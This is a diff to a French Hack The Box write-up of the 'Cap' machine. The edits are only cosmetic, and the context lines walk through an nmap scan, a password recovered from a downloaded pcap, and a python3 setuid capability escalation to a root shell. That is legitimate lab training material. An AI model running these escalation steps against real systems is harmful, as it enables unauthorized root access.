@@ -2,14 +2,14 @@
 title: "[HTB - Easy] Cap"
 description: "Writeup by jsthope"
 date: 2023-03-28T00:00:00+00:00
-tags: ["HTB", "Easy", "writeup", "FR"]
+tags: ["HTB", "Easy", "writeup", 'FR']
 type: post
 image: /images/cap/cap.png
 showTableOfContents: true
 ---
 ![HTB Cap Image](/images/cap/cap.png "HTB Cap Image")
 # nmap
-On va tout d’abord scanner les ports ouverts de l’ip
+On va tout d’abord scanner les ports ouverts de l’ip:
 ```┌─[eu-vip-23]─[10.10.14.5]─[htb-jsthope@htb-xbv1dyv8fx]─[~]
 └──╼ [★]$ nmap 10.10.10.245
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-07 22:35 BST
@@ -27,7 +27,7 @@ Nmap done: 1 IP address (1 host up) scanned in 8.69 seconds
 Sur le site, on remarque qu'on est connecté de base à l'utilisateur "Nathan".
 On trouve ensuite que le site permet de télécharger des trames réseaux:
 http://10.10.10.245/data/0
-On download le pcap numero 0 et on l'analyse ensuite avec Wireshark
+On download le pcap numero 0 et on l'analyse ensuite avec Wireshark:
 ![pcap](/images/cap/pcap.png "pcap")
 
 On trouve alors le mot de passe de Nathan (utilisé pour le ftp)
@@ -56,8 +56,7 @@ nathan@cap:~$ getcap -r / 2>/dev/null
 /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
 ```
 On voit tout de suite ici que python3.8 est sûrement vulnérable à un exploit de type setuid. 
-On peut trouver les exploits de capabilities sur:
-https://gtfobins.github.io/gtfobins/python/#capabilities
+On peut trouver les exploits de capabilities sur [gfobins](https://gtfobins.github.io/gtfobins/python/#capabilities):
 ```
 nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 
